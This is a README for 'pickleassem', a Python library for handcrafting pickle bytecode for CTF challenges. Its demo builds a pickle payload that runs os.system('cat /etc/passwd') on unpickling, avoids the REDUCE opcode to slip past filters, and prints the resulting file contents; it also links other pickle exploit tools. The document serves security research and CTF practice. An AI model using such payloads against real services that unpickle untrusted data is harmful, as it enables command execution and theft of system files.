# pickleassem

[![PyPI - Downloads](https://pepy.tech/badge/pickleassem)](https://pepy.tech/count/pickleassem)
[![PyPI - Version](https://img.shields.io/pypi/v/pickleassem.svg)](https://pypi.org/project/pickleassem)
[![PyPI - Python Version](https://img.shields.io/pypi/pyversions/pickleassem.svg)](https://pypi.org/project/pickleassem)

[![GitHub Actions - Status](https://github.com/gousaiyang/pickleassem/workflows/Build/badge.svg)](https://github.com/gousaiyang/pickleassem/actions?query=workflow%3ABuild)
[![Codecov - Coverage](https://codecov.io/gh/gousaiyang/pickleassem/branch/master/graph/badge.svg)](https://codecov.io/gh/gousaiyang/pickleassem)

A simple pickle assembler to make handcrafting pickle bytecode easier.

This is useful for CTF challenges like [pyshv in Balsn CTF 2019](https://ctftime.org/task/9386).

## Demo

```python
import pickle
import pickletools

from pickleassem import PickleAssembler

pa = PickleAssembler(proto=4)
pa.push_mark()
pa.util_push('cat /etc/passwd')
pa.build_inst('os', 'system')
payload = pa.assemble()
assert b'R' not in payload
print(payload)
pickletools.dis(payload, annotate=1)
pickle.loads(payload)
```

Output:

```
b'\x80\x04(\x8c\x0fcat /etc/passwdios\nsystem\n.'
    0: \x80 PROTO      4 Protocol version indicator.
    2: (    MARK         Push markobject onto the stack.
    3: \x8c     SHORT_BINUNICODE 'cat /etc/passwd' Push a Python Unicode string object.
   20: i        INST       'os system' (MARK at 2) Build a class instance.
   31: .    STOP                                   Stop the unpickling machine.
highest protocol among opcodes = 4
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
```

## Installation

Install with pip: `pip install -U pickleassem`

## Documentation

Just refer to the source code. Each method of `PickleAssembler` whose name begins with `push`, `build`, `pop` or `memo` corresponds to a pickle opcode. Methods whose name begins with `util` are higher-level utility functions. `append_raw` can be used to insert arbitrary raw opcode.

The following opcodes and corresponding features are not implemented: `PERSID`, `BINPERSID`, `EXT1`, `EXT2`, `EXT4`, `FRAME`, `NEXT_BUFFER`, `READONLY_BUFFER`.

## See Also

Other tools for pickle exploit:

- `anapickle`: [slides](https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf), [repo](https://github.com/sensepost/anapickle)
- [`pwnypack.pickle`](https://github.com/edibledinos/pwnypack/blob/master/pwnypack/pickle.py)
